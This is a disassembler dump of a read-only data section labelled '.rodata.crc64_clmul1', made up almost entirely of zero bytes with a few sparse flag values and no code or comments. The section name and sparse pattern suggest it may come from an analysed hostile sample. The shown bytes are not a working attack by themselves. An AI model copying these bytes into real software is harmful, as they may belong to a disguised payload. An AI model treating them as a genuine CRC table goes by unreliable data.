.rodata.crc64_clmul1:000000000000C507                 db    0
.rodata.crc64_clmul1:000000000000C508                 db    0
.rodata.crc64_clmul1:000000000000C509                 db    0
.rodata.crc64_clmul1:000000000000C50A                 db    0
.rodata.crc64_clmul1:000000000000C50B                 db    0
.rodata.crc64_clmul1:000000000000C50C                 db    0
.rodata.crc64_clmul1:000000000000C50D                 db    0
.rodata.crc64_clmul1:000000000000C50E                 db    0
.rodata.crc64_clmul1:000000000000C50F                 db    2
.rodata.crc64_clmul1:000000000000C510                 db    0
.rodata.crc64_clmul1:000000000000C511                 db    0
.rodata.crc64_clmul1:000000000000C512                 db    0
.rodata.crc64_clmul1:000000000000C513                 db    0
.rodata.crc64_clmul1:000000000000C514                 db    0
.rodata.crc64_clmul1:000000000000C515                 db    0
.rodata.crc64_clmul1:000000000000C516                 db    0
.rodata.crc64_clmul1:000000000000C517                 db    0
.rodata.crc64_clmul1:000000000000C518                 db    0
.rodata.crc64_clmul1:000000000000C519                 db    0
.rodata.crc64_clmul1:000000000000C51A                 db    0
.rodata.crc64_clmul1:000000000000C51B                 db    0
.rodata.crc64_clmul1:000000000000C51C                 db  20h
.rodata.crc64_clmul1:000000000000C51D                 db    0
.rodata.crc64_clmul1:000000000000C51E                 db    0
.rodata.crc64_clmul1:000000000000C51F                 db    0
.rodata.crc64_clmul1:000000000000C520                 db    0
.rodata.crc64_clmul1:000000000000C521                 db    0
.rodata.crc64_clmul1:000000000000C522                 db    0
.rodata.crc64_clmul1:000000000000C523                 db    0
.rodata.crc64_clmul1:000000000000C524                 db    0
.rodata.crc64_clmul1:000000000000C525                 db    0
.rodata.crc64_clmul1:000000000000C526                 db    0
.rodata.crc64_clmul1:000000000000C527                 db    0
.rodata.crc64_clmul1:000000000000C528                 db    0
.rodata.crc64_clmul1:000000000000C529                 db    0
.rodata.crc64_clmul1:000000000000C52A                 db    0
.rodata.crc64_clmul1:000000000000C52B                 db    0
.rodata.crc64_clmul1:000000000000C52C                 db    0
.rodata.crc64_clmul1:000000000000C52D                 db    8
.rodata.crc64_clmul1:000000000000C52E                 db    0
.rodata.crc64_clmul1:000000000000C52F                 db    0
.rodata.crc64_clmul1:000000000000C530                 db    0
.rodata.crc64_clmul1:000000000000C531                 db    0
.rodata.crc64_clmul1:000000000000C532                 db    0
.rodata.crc64_clmul1:000000000000C533                 db    0
.rodata.crc64_clmul1:000000000000C534                 db    0
.rodata.crc64_clmul1:000000000000C535                 db    0
.rodata.crc64_clmul1:000000000000C536                 db    0
.rodata.crc64_clmul1:000000000000C537                 db    0
.rodata.crc64_clmul1:000000000000C538                 db    0
.rodata.crc64_clmul1:000000000000C539                 db    0
.rodata.crc64_clmul1:000000000000C53A                 db    0
.rodata.crc64_clmul1:000000000000C53B                 db    0
.rodata.crc64_clmul1:000000000000C53C                 db    8
.rodata.crc64_clmul1:000000000000C53D                 db    0
.rodata.crc64_clmul1:000000000000C53E                 db    0
.rodata.crc64_clmul1:000000000000C53F                 db    0
.rodata.crc64_clmul1:000000000000C540                 db    0
.rodata.crc64_clmul1:000000000000C541                 db    0
.rodata.crc64_clmul1:000000000000C542                 db    0
.rodata.crc64_clmul1:000000000000C543                 db    0
.rodata.crc64_clmul1:000000000000C544                 db    0
.rodata.crc64_clmul1:000000000000C545                 db    0
.rodata.crc64_clmul1:000000000000C546                 db    0
.rodata.crc64_clmul1:000000000000C547                 db    0
.rodata.crc64_clmul1:000000000000C548                 db    0
.rodata.crc64_clmul1:000000000000C549                 db    0
.rodata.crc64_clmul1:000000000000C54A                 db    0
.rodata.crc64_clmul1:000000000000C54B                 db    0
.rodata.crc64_clmul1:000000000000C54C                 db    2
.rodata.crc64_clmul1:000000000000C54D                 db    0
.rodata.crc64_clmul1:000000000000C54E                 db  20h
.rodata.crc64_clmul1:000000000000C54F                 db    0
.rodata.crc64_clmul1:000000000000C550                 db    0
.rodata.crc64_clmul1:000000000000C551                 db    0
.rodata.crc64_clmul1:000000000000C552                 db    0
.rodata.crc64_clmul1:000000000000C553                 db    0
.rodata.crc64_clmul1:000000000000C554                 db    0
.rodata.crc64_clmul1:000000000000C555                 db    0
.rodata.crc64_clmul1:000000000000C556                 db    0
.rodata.crc64_clmul1:000000000000C557                 db    0
.rodata.crc64_clmul1:000000000000C558                 db    0
.rodata.crc64_clmul1:000000000000C559                 db    0
.rodata.crc64_clmul1:000000000000C55A                 db    0
.rodata.crc64_clmul1:000000000000C55B                 db    0
.rodata.crc64_clmul1:000000000000C55C                 db    0
.rodata.crc64_clmul1:000000000000C55D                 db    0
.rodata.crc64_clmul1:000000000000C55E                 db  10h
.rodata.crc64_clmul1:000000000000C55F                 db    0
.rodata.crc64_clmul1:000000000000C560                 db    0
.rodata.crc64_clmul1:000000000000C561                 db    0
.rodata.crc64_clmul1:000000000000C562                 db    0
.rodata.crc64_clmul1:000000000000C563                 db    0
.rodata.crc64_clmul1:000000000000C564                 db    0
.rodata.crc64_clmul1:000000000000C565                 db    0
.rodata.crc64_clmul1:000000000000C566                 db    0
.rodata.crc64_clmul1:000000000000C567                 db    0
.rodata.crc64_clmul1:000000000000C568                 db    0
.rodata.crc64_clmul1:000000000000C569                 db    0
.rodata.crc64_clmul1:000000000000C56A                 db    0
.rodata.crc64_clmul1:000000000000C56B                 db    0
.rodata.crc64_clmul1:000000000000C56C                 db    0
.rodata.crc64_clmul1:000000000000C56D                 db  42h ; B
.rodata.crc64_clmul1:000000000000C56E                 db    0
.rodata.crc64_clmul1:000000000000C56F                 db    0
.rodata.crc64_clmul1:000000000000C570                 db    0
.rodata.crc64_clmul1:000000000000C571                 db    0
.rodata.crc64_clmul1:000000000000C572                 db    0
.rodata.crc64_clmul1:000000000000C573                 db    0
.rodata.crc64_clmul1:000000000000C574                 db    0
.rodata.crc64_clmul1:000000000000C575                 db    0
.rodata.crc64_clmul1:000000000000C576                 db    0
.rodata.crc64_clmul1:000000000000C577                 db    0
.rodata.crc64_clmul1:000000000000C578                 db    0
.rodata.crc64_clmul1:000000000000C579                 db    0
.rodata.crc64_clmul1:000000000000C57A                 db    0
.rodata.crc64_clmul1:000000000000C57B                 db  80h
.rodata.crc64_clmul1:000000000000C57C                 db    0
.rodata.crc64_clmul1:000000000000C57D                 db    0
.rodata.crc64_clmul1:000000000000C57E                 db    0
.rodata.crc64_clmul1:000000000000C57F                 db    0
.rodata.crc64_clmul1:000000000000C580                 db    0
.rodata.crc64_clmul1:000000000000C581                 db    0
.rodata.crc64_clmul1:000000000000C582                 db    0
.rodata.crc64_clmul1:000000000000C583                 db    0
.rodata.crc64_clmul1:000000000000C584                 db    0
.rodata.crc64_clmul1:000000000000C585                 db    0
.rodata.crc64_clmul1:000000000000C586                 db    0
.rodata.crc64_clmul1:000000000000C587                 db    0
.rodata.crc64_clmul1:000000000000C588                 db    0
.rodata.crc64_clmul1:000000000000C589                 db    0
.rodata.crc64_clmul1:000000000000C58A                 db    0
.rodata.crc64_clmul1:000000000000C58B                 db    0
.rodata.crc64_clmul1:000000000000C58C                 db  54h ; T
.rodata.crc64_clmul1:000000000000C58D                 db  40h ; @
.rodata.crc64_clmul1:000000000000C58E                 db    0
.rodata.crc64_clmul1:000000000000C58F                 db    0
.rodata.crc64_clmul1:000000000000C590                 db    0
.rodata.crc64_clmul1:000000000000C591                 db    0
.rodata.crc64_clmul1:000000000000C592                 db    0
.rodata.crc64_clmul1:000000000000C593                 db    0
.rodata.crc64_clmul1:000000000000C594                 db    0
.rodata.crc64_clmul1:000000000000C595                 db    0
.rodata.crc64_clmul1:000000000000C596                 db    0
.rodata.crc64_clmul1:000000000000C597                 db    0
.rodata.crc64_clmul1:000000000000C598                 db    0
.rodata.crc64_clmul1:000000000000C599                 db  40h ; @
.rodata.crc64_clmul1:000000000000C59A                 db    0
.rodata.crc64_clmul1:000000000000C59B                 db    0
.rodata.crc64_clmul1:000000000000C59C                 db    0
.rodata.crc64_clmul1:000000000000C59D                 db    0
.rodata.crc64_clmul1:000000000000C59E                 db    0
.rodata.crc64_clmul1:000000000000C59F                 db    0
.rodata.crc64_clmul1:000000000000C5A0                 db    0
.rodata.crc64_clmul1:000000000000C5A1                 db    4
.rodata.crc64_clmul1:000000000000C5A2                 db    0
.rodata.crc64_clmul1:000000000000C5A3                 db    0
.rodata.crc64_clmul1:000000000000C5A4                 db    0
.rodata.crc64_clmul1:000000000000C5A5                 db    0
.rodata.crc64_clmul1:000000000000C5A6                 db    0
.rodata.crc64_clmul1:000000000000C5A7                 db    0
.rodata.crc64_clmul1:000000000000C5A8                 db    0
.rodata.crc64_clmul1:000000000000C5A9                 db    0
.rodata.crc64_clmul1:000000000000C5AA                 db    0
.rodata.crc64_clmul1:000000000000C5AB                 db    0
.rodata.crc64_clmul1:000000000000C5AC                 db    0
.rodata.crc64_clmul1:000000000000C5AD                 db    0
.rodata.crc64_clmul1:000000000000C5AE                 db    0
.rodata.crc64_clmul1:000000000000C5AF                 db    0
.rodata.crc64_clmul1:000000000000C5B0                 db    0
.rodata.crc64_clmul1:000000000000C5B1                 db    0
.rodata.crc64_clmul1:000000000000C5B2                 db    0
.rodata.crc64_clmul1:000000000000C5B3                 db    0
.rodata.crc64_clmul1:000000000000C5B4                 db    0
.rodata.crc64_clmul1:000000000000C5B5                 db    0
.rodata.crc64_clmul1:000000000000C5B6                 db    0
.rodata.crc64_clmul1:000000000000C5B7                 db    0
.rodata.crc64_clmul1:000000000000C5B8                 db    0
.rodata.crc64_clmul1:000000000000C5B9                 db    0
.rodata.crc64_clmul1:000000000000C5BA                 db    0
.rodata.crc64_clmul1:000000000000C5BB                 db    0
.rodata.crc64_clmul1:000000000000C5BC                 db  80h
.rodata.crc64_clmul1:000000000000C5BD                 db    0
.rodata.crc64_clmul1:000000000000C5BE                 db    0
.rodata.crc64_clmul1:000000000000C5BF                 db    0
.rodata.crc64_clmul1:000000000000C5C0                 db    0
.rodata.crc64_clmul1:000000000000C5C1                 db    0
.rodata.crc64_clmul1:000000000000C5C2                 db    0
.rodata.crc64_clmul1:000000000000C5C3                 db    0
.rodata.crc64_clmul1:000000000000C5C4                 db    0
.rodata.crc64_clmul1:000000000000C5C5                 db    0
.rodata.crc64_clmul1:000000000000C5C6                 db    0
.rodata.crc64_clmul1:000000000000C5C7                 db    0
.rodata.crc64_clmul1:000000000000C5C8                 db    0
.rodata.crc64_clmul1:000000000000C5C9                 db    0
.rodata.crc64_clmul1:000000000000C5CA                 db    0
.rodata.crc64_clmul1:000000000000C5CB                 db    0
.rodata.crc64_clmul1:000000000000C5CC                 db    2
.rodata.crc64_clmul1:000000000000C5CD                 db    0
.rodata.crc64_clmul1:000000000000C5CE                 db    0
.rodata.crc64_clmul1:000000000000C5CF                 db    0
.rodata.crc64_clmul1:000000000000C5D0                 db    0
.rodata.crc64_clmul1:000000000000C5D1                 db    0
.rodata.crc64_clmul1:000000000000C5D2                 db    0
.rodata.crc64_clmul1:000000000000C5D3                 db    0
.rodata.crc64_clmul1:000000000000C5D4                 db    0
.rodata.crc64_clmul1:000000000000C5D5                 db    0
.rodata.crc64_clmul1:000000000000C5D6                 db    0
.rodata.crc64_clmul1:000000000000C5D7                 db    0
.rodata.crc64_clmul1:000000000000C5D8                 db    0
.rodata.crc64_clmul1:000000000000C5D9                 db    0
.rodata.crc64_clmul1:000000000000C5DA                 db    0
.rodata.crc64_clmul1:000000000000C5DB                 db    0
.rodata.crc64_clmul1:000000000000C5DC                 db  88h
.rodata.crc64_clmul1:000000000000C5DD                 db    0
.rodata.crc64_clmul1:000000000000C5DE                 db    0
.rodata.crc64_clmul1:000000000000C5DF                 db    0
.rodata.crc64_clmul1:000000000000C5E0                 db    0
.rodata.crc64_clmul1:000000000000C5E1                 db    0
.rodata.crc64_clmul1:000000000000C5E2                 db    0
.rodata.crc64_clmul1:000000000000C5E3                 db    0
.rodata.crc64_clmul1:000000000000C5E4                 db    0
.rodata.crc64_clmul1:000000000000C5E5                 db    0
.rodata.crc64_clmul1:000000000000C5E6                 db    0
.rodata.crc64_clmul1:000000000000C5E7                 db    0
.rodata.crc64_clmul1:000000000000C5E8                 db    0
.rodata.crc64_clmul1:000000000000C5E9                 db    0
.rodata.crc64_clmul1:000000000000C5EA                 db    0
.rodata.crc64_clmul1:000000000000C5EB                 db    0
.rodata.crc64_clmul1:000000000000C5EC                 db    0
.rodata.crc64_clmul1:000000000000C5ED                 db  40h ; @
.rodata.crc64_clmul1:000000000000C5EE                 db  20h
.rodata.crc64_clmul1:000000000000C5EF                 db    0
.rodata.crc64_clmul1:000000000000C5F0                 db    0
.rodata.crc64_clmul1:000000000000C5F1                 db    0
.rodata.crc64_clmul1:000000000000C5F2                 db    0
.rodata.crc64_clmul1:000000000000C5F3                 db    0
.rodata.crc64_clmul1:000000000000C5F4                 db    0
.rodata.crc64_clmul1:000000000000C5F5                 db    0
.rodata.crc64_clmul1:000000000000C5F6                 db    0
.rodata.crc64_clmul1:000000000000C5F7                 db    0
.rodata.crc64_clmul1:000000000000C5F8                 db    0
.rodata.crc64_clmul1:000000000000C5F9                 db    0
.rodata.crc64_clmul1:000000000000C5FA                 db    0
.rodata.crc64_clmul1:000000000000C5FB                 db    2
.rodata.crc64_clmul1:000000000000C5FC                 db    0
.rodata.crc64_clmul1:000000000000C5FD                 db    0
.rodata.crc64_clmul1:000000000000C5FE                 db    0
.rodata.crc64_clmul1:000000000000C5FF                 db    0
.rodata.crc64_clmul1:000000000000C600                 db    0
.rodata.crc64_clmul1:000000000000C601                 db    0
.rodata.crc64_clmul1:000000000000C602                 db    0
.rodata.crc64_clmul1:000000000000C603                 db    0
.rodata.crc64_clmul1:000000000000C604                 db    0
.rodata.crc64_clmul1:000000000000C605                 db    0
.rodata.crc64_clmul1:000000000000C606                 db    0
.rodata.crc64_clmul1:000000000000C607                 db    0
.rodata.crc64_clmul1:000000000000C608                 db    2
.rodata.crc64_clmul1:000000000000C609                 db    0
.rodata.crc64_clmul1:000000000000C60A                 db    0
.rodata.crc64_clmul1:000000000000C60B                 db    0
.rodata.crc64_clmul1:000000000000C60C                 db    0
.rodata.crc64_clmul1:000000000000C60D                 db    0
.rodata.crc64_clmul1:000000000000C60E                 db    0
.rodata.crc64_clmul1:000000000000C60F                 db    0
.rodata.crc64_clmul1:000000000000C610                 db    0
.rodata.crc64_clmul1:000000000000C611                 db    0
.rodata.crc64_clmul1:000000000000C612                 db    0
.rodata.crc64_clmul1:000000000000C613                 db    0
.rodata.crc64_clmul1:000000000000C614                 db    0
.rodata.crc64_clmul1:000000000000C615                 db    0
.rodata.crc64_clmul1:000000000000C616                 db    0
.rodata.crc64_clmul1:000000000000C617                 db    0
.rodata.crc64_clmul1:000000000000C618                 db    0
.rodata.crc64_clmul1:000000000000C619                 db  10h
.rodata.crc64_clmul1:000000000000C61A                 db    0
.rodata.crc64_clmul1:000000000000C61B                 db    0
.rodata.crc64_clmul1:000000000000C61C                 db    0
.rodata.crc64_clmul1:000000000000C61D                 db    0
.rodata.crc64_clmul1:000000000000C61E                 db    0
.rodata.crc64_clmul1:000000000000C61F                 db    0
.rodata.crc64_clmul1:000000000000C620                 db    0
.rodata.crc64_clmul1:000000000000C621                 db    0
.rodata.crc64_clmul1:000000000000C622                 db    0
.rodata.crc64_clmul1:000000000000C623                 db    0
.rodata.crc64_clmul1:000000000000C624                 db    0
.rodata.crc64_clmul1:000000000000C625                 db    0
.rodata.crc64_clmul1:000000000000C626                 db    0
.rodata.crc64_clmul1:000000000000C627                 db    0
.rodata.crc64_clmul1:000000000000C628                 db    0
.rodata.crc64_clmul1:000000000000C629                 db    0
.rodata.crc64_clmul1:000000000000C62A                 db    1
.rodata.crc64_clmul1:000000000000C62B                 db    0
.rodata.crc64_clmul1:000000000000C62C                 db    0
.rodata.crc64_clmul1:000000000000C62D                 db    0
.rodata.crc64_clmul1:000000000000C62E                 db    0
.rodata.crc64_clmul1:000000000000C62F                 db    0
.rodata.crc64_clmul1:000000000000C630                 db    0
.rodata.crc64_clmul1:000000000000C631                 db    0
.rodata.crc64_clmul1:000000000000C632                 db    0
.rodata.crc64_clmul1:000000000000C633                 db    0
.rodata.crc64_clmul1:000000000000C634                 db    0
.rodata.crc64_clmul1:000000000000C635                 db    0
.rodata.crc64_clmul1:000000000000C636                 db    0
.rodata.crc64_clmul1:000000000000C637                 db    0
.rodata.crc64_clmul1:000000000000C638                 db    0
.rodata.crc64_clmul1:000000000000C639                 db    0
.rodata.crc64_clmul1:000000000000C63A                 db    8
.rodata.crc64_clmul1:000000000000C63B                 db    0
.rodata.crc64_clmul1:000000000000C63C                 db    0
.rodata.crc64_clmul1:000000000000C63D                 db    0
.rodata.crc64_clmul1:000000000000C63E                 db    0
.rodata.crc64_clmul1:000000000000C63F                 db    0
.rodata.crc64_clmul1:000000000000C640                 db    0
.rodata.crc64_clmul1:000000000000C641                 db    0
.rodata.crc64_clmul1:000000000000C642                 db    0
.rodata.crc64_clmul1:000000000000C643                 db    0
.rodata.crc64_clmul1:000000000000C644                 db    0
.rodata.crc64_clmul1:000000000000C645                 db    0
.rodata.crc64_clmul1:000000000000C646                 db    0
.rodata.crc64_clmul1:000000000000C647                 db    0
.rodata.crc64_clmul1:000000000000C648                 db    0
.rodata.crc64_clmul1:000000000000C649                 db    0
.rodata.crc64_clmul1:000000000000C64A                 db    0
.rodata.crc64_clmul1:000000000000C64B                 db    0
.rodata.crc64_clmul1:000000000000C64C                 db    0
.rodata.crc64_clmul1:000000000000C64D                 db    0
.rodata.crc64_clmul1:000000000000C64E                 db  22h ; "
.rodata.crc64_clmul1:000000000000C64F                 db    0
.rodata.crc64_clmul1:000000000000C650                 db    0
.rodata.crc64_clmul1:000000000000C651                 db    0
.rodata.crc64_clmul1:000000000000C652                 db    0
.rodata.crc64_clmul1:000000000000C653                 db    0
.rodata.crc64_clmul1:000000000000C654                 db    0
.rodata.crc64_clmul1:000000000000C655                 db    0
.rodata.crc64_clmul1:000000000000C656                 db    1
.rodata.crc64_clmul1:000000000000C657                 db    0
.rodata.crc64_clmul1:000000000000C658                 db    0
.rodata.crc64_clmul1:000000000000C659                 db    0
.rodata.crc64_clmul1:000000000000C65A                 db    0
.rodata.crc64_clmul1:000000000000C65B                 db    0
.rodata.crc64_clmul1:000000000000C65C                 db    0
.rodata.crc64_clmul1:000000000000C65D                 db    0
.rodata.crc64_clmul1:000000000000C65E                 db    0
.rodata.crc64_clmul1:000000000000C65F                 db    0
.rodata.crc64_clmul1:000000000000C660                 db    0
.rodata.crc64_clmul1:000000000000C661                 db    0
.rodata.crc64_clmul1:000000000000C662                 db    0
.rodata.crc64_clmul1:000000000000C663                 db    0
.rodata.crc64_clmul1:000000000000C664                 db    0
.rodata.crc64_clmul1:000000000000C665                 db    0
.rodata.crc64_clmul1:000000000000C666                 db    0
.rodata.crc64_clmul1:000000000000C667                 db    0
.rodata.crc64_clmul1:000000000000C668                 db    0
.rodata.crc64_clmul1:000000000000C669                 db    2
.rodata.crc64_clmul1:000000000000C66A                 db    8
.rodata.crc64_clmul1:000000000000C66B                 db    0
.rodata.crc64_clmul1:000000000000C66C                 db    0
.rodata.crc64_clmul1:000000000000C66D                 db    0
.rodata.crc64_clmul1:000000000000C66E                 db    0
.rodata.crc64_clmul1:000000000000C66F                 db    0
.rodata.crc64_clmul1:000000000000C670                 db    0
.rodata.crc64_clmul1:000000000000C671                 db    0
.rodata.crc64_clmul1:000000000000C672                 db    0
.rodata.crc64_clmul1:000000000000C673                 db    0
.rodata.crc64_clmul1:000000000000C674                 db    0
.rodata.crc64_clmul1:000000000000C675                 db    0
.rodata.crc64_clmul1:000000000000C676                 db    0
.rodata.crc64_clmul1:000000000000C677                 db    0
.rodata.crc64_clmul1:000000000000C678                 db    0
.rodata.crc64_clmul1:000000000000C679                 db    0
.rodata.crc64_clmul1:000000000000C67A                 db    0
.rodata.crc64_clmul1:000000000000C67B                 db    0
.rodata.crc64_clmul1:000000000000C67C                 db  80h
.rodata.crc64_clmul1:000000000000C67D                 db    0
.rodata.crc64_clmul1:000000000000C67E                 db    1
.rodata.crc64_clmul1:000000000000C67F                 db    0
.rodata.crc64_clmul1:000000000000C680                 db    0
.rodata.crc64_clmul1:000000000000C681                 db    0
.rodata.crc64_clmul1:000000000000C682                 db    0
.rodata.crc64_clmul1:000000000000C683                 db    0
.rodata.crc64_clmul1:000000000000C684                 db    0
.rodata.crc64_clmul1:000000000000C685                 db    0
.rodata.crc64_clmul1:000000000000C686                 db    0
.rodata.crc64_clmul1:000000000000C687                 db    0
.rodata.crc64_clmul1:000000000000C688                 db  20h
.rodata.crc64_clmul1:000000000000C689                 db    0
.rodata.crc64_clmul1:000000000000C68A                 db    0
.rodata.crc64_clmul1:000000000000C68B                 db    0
.rodata.crc64_clmul1:000000000000C68C                 db    0
.rodata.crc64_clmul1:000000000000C68D                 db    0
.rodata.crc64_clmul1:000000000000C68E                 db    0
.rodata.crc64_clmul1:000000000000C68F                 db    0
.rodata.crc64_clmul1:000000000000C690                 db    0
.rodata.crc64_clmul1:000000000000C691                 db    0
.rodata.crc64_clmul1:000000000000C692                 db    0
.rodata.crc64_clmul1:000000000000C693                 db    0
.rodata.crc64_clmul1:000000000000C694                 db    0
.rodata.crc64_clmul1:000000000000C695                 db    0
.rodata.crc64_clmul1:000000000000C696                 db    0
.rodata.crc64_clmul1:000000000000C697                 db    0
.rodata.crc64_clmul1:000000000000C698                 db    0
.rodata.crc64_clmul1:000000000000C699                 db    0
.rodata.crc64_clmul1:000000000000C69A                 db  10h
.rodata.crc64_clmul1:000000000000C69B                 db    0
.rodata.crc64_clmul1:000000000000C69C                 db    0
.rodata.crc64_clmul1:000000000000C69D                 db    0
.rodata.crc64_clmul1:000000000000C69E                 db    0
.rodata.crc64_clmul1:000000000000C69F                 db    0
.rodata.crc64_clmul1:000000000000C6A0                 db    0
.rodata.crc64_clmul1:000000000000C6A1                 db    0
.rodata.crc64_clmul1:000000000000C6A2                 db    0
.rodata.crc64_clmul1:000000000000C6A3                 db    0
.rodata.crc64_clmul1:000000000000C6A4                 db    0
.rodata.crc64_clmul1:000000000000C6A5                 db    0
.rodata.crc64_clmul1:000000000000C6A6                 db    0
.rodata.crc64_clmul1:000000000000C6A7                 db    0
.rodata.crc64_clmul1:000000000000C6A8                 db    0
.rodata.crc64_clmul1:000000000000C6A9                 db    2
.rodata.crc64_clmul1:000000000000C6AA                 db    0
.rodata.crc64_clmul1:000000000000C6AB                 db    0
.rodata.crc64_clmul1:000000000000C6AC                 db    0
.rodata.crc64_clmul1:000000000000C6AD                 db    0
.rodata.crc64_clmul1:000000000000C6AE                 db    0
.rodata.crc64_clmul1:000000000000C6AF                 db    0
.rodata.crc64_clmul1:000000000000C6B0                 db    0
.rodata.crc64_clmul1:000000000000C6B1                 db    0
.rodata.crc64_clmul1:000000000000C6B2                 db    0
.rodata.crc64_clmul1:000000000000C6B3                 db    0
.rodata.crc64_clmul1:000000000000C6B4                 db    0
.rodata.crc64_clmul1:000000000000C6B5                 db    0
.rodata.crc64_clmul1:000000000000C6B6                 db    0
.rodata.crc64_clmul1:000000000000C6B7                 db    0
.rodata.crc64_clmul1:000000000000C6B8                 db    0
.rodata.crc64_clmul1:000000000000C6B9                 db  80h
.rodata.crc64_clmul1:000000000000C6BA                 db    0
.rodata.crc64_clmul1:000000000000C6BB                 db    0
.rodata.crc64_clmul1:000000000000C6BC                 db    0
.rodata.crc64_clmul1:000000000000C6BD                 db    0
.rodata.crc64_clmul1:000000000000C6BE                 db    0
.rodata.crc64_clmul1:000000000000C6BF                 db    0
.rodata.crc64_clmul1:000000000000C6C0                 db    0
.rodata.crc64_clmul1:000000000000C6C1                 db    0
.rodata.crc64_clmul1:000000000000C6C2                 db    0
.rodata.crc64_clmul1:000000000000C6C3                 db    0
.rodata.crc64_clmul1:000000000000C6C4                 db    0
.rodata.crc64_clmul1:000000000000C6C5                 db    0
.rodata.crc64_clmul1:000000000000C6C6                 db    0
.rodata.crc64_clmul1:000000000000C6C7                 db    0
.rodata.crc64_clmul1:000000000000C6C8                 db    0
.rodata.crc64_clmul1:000000000000C6C9                 db    8
.rodata.crc64_clmul1:000000000000C6CA                 db    1
.rodata.crc64_clmul1:000000000000C6CB                 db    0
.rodata.crc64_clmul1:000000000000C6CC                 db    0
.rodata.crc64_clmul1:000000000000C6CD                 db    0
.rodata.crc64_clmul1:000000000000C6CE                 db    0
.rodata.crc64_clmul1:000000000000C6CF                 db    0
.rodata.crc64_clmul1:000000000000C6D0                 db    0
.rodata.crc64_clmul1:000000000000C6D1                 db    0
.rodata.crc64_clmul1:000000000000C6D2                 db    0
.rodata.crc64_clmul1:000000000000C6D3                 db    0
.rodata.crc64_clmul1:000000000000C6D4                 db    0
.rodata.crc64_clmul1:000000000000C6D5                 db    0
.rodata.crc64_clmul1:000000000000C6D6                 db    0
.rodata.crc64_clmul1:000000000000C6D7                 db    0
.rodata.crc64_clmul1:000000000000C6D8                 db    0
.rodata.crc64_clmul1:000000000000C6D9                 db    0
.rodata.crc64_clmul1:000000000000C6DA                 db    0
.rodata.crc64_clmul1:000000000000C6DB                 db    0
.rodata.crc64_clmul1:000000000000C6DC                 db  40h ; @
.rodata.crc64_clmul1:000000000000C6DD                 db  40h ; @
.rodata.crc64_clmul1:000000000000C6DE                 db    0
.rodata.crc64_clmul1:000000000000C6DF                 db    0
.rodata.crc64_clmul1:000000000000C6E0                 db    0
.rodata.crc64_clmul1:000000000000C6E1                 db    0
.rodata.crc64_clmul1:000000000000C6E2                 db    0
.rodata.crc64_clmul1:000000000000C6E3                 db    0
.rodata.crc64_clmul1:000000000000C6E4                 db    0
.rodata.crc64_clmul1:000000000000C6E5                 db    0
.rodata.crc64_clmul1:000000000000C6E6                 db    0
.rodata.crc64_clmul1:000000000000C6E7                 db    0
.rodata.crc64_clmul1:000000000000C6E8                 db    0
.rodata.crc64_clmul1:000000000000C6E9                 db    0
.rodata.crc64_clmul1:000000000000C6EA                 db    0
.rodata.crc64_clmul1:000000000000C6EB                 db    1
.rodata.crc64_clmul1:000000000000C6EC                 db    0
.rodata.crc64_clmul1:000000000000C6ED                 db    0
.rodata.crc64_clmul1:000000000000C6EE                 db    0
.rodata.crc64_clmul1:000000000000C6EF                 db    0
.rodata.crc64_clmul1:000000000000C6F0                 db    0
.rodata.crc64_clmul1:000000000000C6F1                 db    0
.rodata.crc64_clmul1:000000000000C6F2                 db    0
.rodata.crc64_clmul1:000000000000C6F3                 db    0
.rodata.crc64_clmul1:000000000000C6F4                 db    0
.rodata.crc64_clmul1:000000000000C6F5                 db    0
.rodata.crc64_clmul1:000000000000C6F6                 db    0
.rodata.crc64_clmul1:000000000000C6F7                 db    0
.rodata.crc64_clmul1:000000000000C6F8                 db    8
.rodata.crc64_clmul1:000000000000C6F9                 db    0
.rodata.crc64_clmul1:000000000000C6FA                 db    0
.rodata.crc64_clmul1:000000000000C6FB                 db    0
.rodata.crc64_clmul1:000000000000C6FC                 db    0
.rodata.crc64_clmul1:000000000000C6FD                 db    0
.rodata.crc64_clmul1:000000000000C6FE                 db    0
.rodata.crc64_clmul1:000000000000C6FF                 db    0
.rodata.crc64_clmul1:000000000000C700                 db    0
.rodata.crc64_clmul1:000000000000C701                 db    0
.rodata.crc64_clmul1:000000000000C702                 db    0
.rodata.crc64_clmul1:000000000000C703                 db    0
.rodata.crc64_clmul1:000000000000C704                 db    0
.rodata.crc64_clmul1:000000000000C705                 db    0
.rodata.crc64_clmul1:000000000000C706                 db    0
.rodata.crc64_clmul1:000000000000C707                 db    0
.rodata.crc64_clmul1:000000000000C708                 db    0
.rodata.crc64_clmul1:000000000000C709                 db    0
.rodata.crc64_clmul1:000000000000C70A                 db    4
.rodata.crc64_clmul1:000000000000C70B                 db    0
.rodata.crc64_clmul1:000000000000C70C                 db    0
.rodata.crc64_clmul1:000000000000C70D                 db    0
.rodata.crc64_clmul1:000000000000C70E                 db    0
.rodata.crc64_clmul1:000000000000C70F                 db    0
.rodata.crc64_clmul1:000000000000C710                 db    0
.rodata.crc64_clmul1:000000000000C711                 db    0
.rodata.crc64_clmul1:000000000000C712                 db    0
.rodata.crc64_clmul1:000000000000C713                 db    0
.rodata.crc64_clmul1:000000000000C714                 db    0
.rodata.crc64_clmul1:000000000000C715                 db    0
.rodata.crc64_clmul1:000000000000C716                 db    0
.rodata.crc64_clmul1:000000000000C717                 db    0
.rodata.crc64_clmul1:000000000000C718                 db    0
.rodata.crc64_clmul1:000000000000C719                 db    1
.rodata.crc64_clmul1:000000000000C71A                 db    0
.rodata.crc64_clmul1:000000000000C71B                 db    0
.rodata.crc64_clmul1:000000000000C71C                 db    0
.rodata.crc64_clmul1:000000000000C71D                 db    0
.rodata.crc64_clmul1:000000000000C71E                 db    0
.rodata.crc64_clmul1:000000000000C71F                 db    0
.rodata.crc64_clmul1:000000000000C720                 db    0
.rodata.crc64_clmul1:000000000000C721                 db    0
.rodata.crc64_clmul1:000000000000C722                 db    0
.rodata.crc64_clmul1:000000000000C723                 db    0
.rodata.crc64_clmul1:000000000000C724                 db    0
.rodata.crc64_clmul1:000000000000C725                 db    0
.rodata.crc64_clmul1:000000000000C726                 db    0
.rodata.crc64_clmul1:000000000000C727                 db    0
.rodata.crc64_clmul1:000000000000C728                 db    0
.rodata.crc64_clmul1:000000000000C729                 db    0
.rodata.crc64_clmul1:000000000000C72A                 db    0
.rodata.crc64_clmul1:000000000000C72B                 db    0
.rodata.crc64_clmul1:000000000000C72C                 db    0
.rodata.crc64_clmul1:000000000000C72D                 db    0
.rodata.crc64_clmul1:000000000000C72E                 db    0
.rodata.crc64_clmul1:000000000000C72F                 db    1
.rodata.crc64_clmul1:000000000000C730                 db    0
.rodata.crc64_clmul1:000000000000C731                 db    0
